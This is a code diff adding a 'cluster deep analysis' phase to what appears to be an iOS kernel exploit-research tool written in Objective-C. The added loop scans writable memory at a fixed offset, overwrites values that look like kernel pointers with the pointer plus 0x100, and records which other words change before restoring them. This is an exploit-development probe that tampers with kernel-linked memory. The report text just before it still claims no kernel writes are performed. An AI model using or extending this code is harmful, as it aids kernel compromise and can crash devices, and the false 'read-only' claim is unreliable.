@@ -470,6 +470,55 @@ static BOOL isKernelPointer(uint64_t v) {
     [report appendFormat:@"\nstructures analyzed: %d\n", structuresFound];
     [report appendString:@"Read-only analysis complete. No kernel writes performed.\n"];
 
+    // --- Phase 9: cluster deep analysis ---
+    [report appendString:@"\n--- Phase 9: cluster deep analysis ---\n"];
+
+    scanAddr = 0; scanSize = 0;
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint32_t d9 = 0;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d9,
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+
+        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+
+        size_t clusterStart = 0x5ef00 / 8;
+        size_t clusterEnd = 0x5f400 / 8;
+        if (clusterEnd > words) continue;
+
+        uint64_t *fullSnap = malloc(scanSize);
+        if (!fullSnap) continue;
+        memcpy(fullSnap, (void *)scanAddr, scanSize);
+
+        for (size_t ci = clusterStart; ci < clusterEnd && ci < words; ci++) {
+            uint64_t v = rp[ci];
+            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
+
+            rp[ci] = v + 0x100;
+            usleep(200);
+
+            int nd = 0;
+            for (size_t j = 0; j < words && nd < 20; j++) {
+                if (j == ci) continue;
+                if (rp[j] != fullSnap[j]) {
+                    [report appendFormat:@"cluster+0x%zx kptr=0x%llx -> diff at +0x%zx: 0x%llx -> 0x%llx\n",
+                     ci * 8, v, j * 8, fullSnap[j], rp[j]];
+                    nd++;
+                }
+            }
+            rp[ci] = v;
+            usleep(100);
+        }
+
+        memcpy((void *)scanAddr, fullSnap, scanSize);
+        free(fullSnap);
+        break;
+    }
+
     // --- Verdict ---
     [report appendString:@"\n"];
     if (kptrCount > 0) {
